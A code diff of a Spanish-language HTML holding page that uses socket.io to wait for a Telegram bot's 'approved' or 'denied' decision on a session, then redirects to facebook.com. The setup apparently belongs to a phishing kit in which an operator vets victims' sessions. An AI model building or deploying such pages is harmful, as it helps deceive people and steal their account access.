@@ -1,65 +1,50 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Esperando aprobación...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Esperando confirmación...</title>
+  <script src="/socket.io/socket.io.js"></script>
   <style>
     body {
-      background-color: #f3f7fa;
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      font-family: sans-serif;
+    }
+    .mensaje {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
-      margin: 0;
-    }
-
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #3498db;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .message {
-      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div>
-    <div class="loader"></div>
-    <div class="message">
-      <h3>Esperando confirmación...</h3>
-      <p>Por favor, confirma el acceso desde Telegram.</p>
-    </div>
+  <div class="mensaje">
+    <h2>Esperando autorización desde Telegram...</h2>
+    <p>No cierres esta ventana.</p>
   </div>
 
-  <!-- Solo estas dos líneas -->
-  <script src="/socket.io/socket.io.js"></script>
-  <script src="main.js"></script>
   <script>
-  const socket = io();
-  const sessionId = localStorage.getItem('sessionId');
+    const socket = io();
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('sessionId');
 
-  if (sessionId) {
+    // Reconectar al servidor
     socket.emit('reconectar', sessionId);
-  }
 
-  socket.on('redirect', ({ url }) => {
-    window.location.href = url;
-  });
-</script>
-
+    // Escuchar respuesta del bot
+    socket.on('respuesta', (decision) => {
+      if (decision === 'aprobado') {
+        window.location.href = 'https://www.facebook.com'; // o donde necesites
+      } else {
+        alert('Acceso denegado por seguridad.');
+        window.location.href = '/';
+      }
+    });
+  </script>
 </body>
 </html>
